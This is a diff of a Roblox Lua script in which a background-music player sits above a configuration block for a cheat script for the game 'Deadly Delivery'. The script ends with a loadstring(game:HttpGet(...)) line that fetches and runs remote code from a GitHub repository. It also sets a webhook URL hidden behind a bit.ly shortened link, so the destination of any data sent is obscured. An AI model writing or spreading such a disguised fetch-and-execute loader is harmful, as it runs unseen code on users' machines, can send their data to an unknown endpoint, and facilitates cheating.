@@ -1,35 +1,30 @@
 local SoundService = game:GetService("SoundService")
 
+-- https://robloxsong.com
 local musicIds = {
-    "rbxassetid://78793729048442",
-    "rbxassetid://80936272044791",
-}
-
-local lastIndex = 0
+    "rbxassetid://1838667764",
+    "rbxassetid://1838667168",
+    "rbxassetid://1845409587",
+    "rbxassetid://1836334770",
+    "rbxassetid://1841238825"
+};
 
 local sound = Instance.new("Sound")
 sound.Volume = 0.5
-sound.Looped = true
+sound.Looped = false
 sound.Parent = SoundService
 
-local function getRandomIndex()
-    local index
-    repeat
-        index = math.random(#musicIds)
-    until index ~= lastIndex
-    lastIndex = index
-    return index
-end
-
 sound.Ended:Connect(function()
-    sound.SoundId = musicIds[getRandomIndex()]
+    sound.SoundId = musicIds[math.random(#musicIds)]
     sound:Play()
 end)
 
-sound.SoundId = musicIds[getRandomIndex()]
+-- 初回再生
+sound.SoundId = musicIds[math.random(#musicIds)]
 sound:Play()
 
 -- true = オン | false = オフ
+-- ⌥ WebhookURL
 getgenv().WebhookURL = "http://bit.ly/4ssAHs3"
 getgenv().ScriptConfig = {
     SellAll = false, -- 次の実行でアイテムの取得を停止したい場合を除き、trueに設定します
@@ -44,6 +39,6 @@ getgenv().ScriptConfig = {
     HideFood = 20, -- 値設定の下にある食べ物をエレベーターに隠し、無効に0に設定します
     WaitBeforeVote = 0.5, -- 投票する前に秒/秒の（数）を待ちます
     WalkSpeed = 20, -- ダンジョンにいるときに歩行速度を変更し、一度だけ変更できます
-}
+};
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SNSDARK/Scripts/refs/heads/main/Deadly%20Delivery.lua"))()
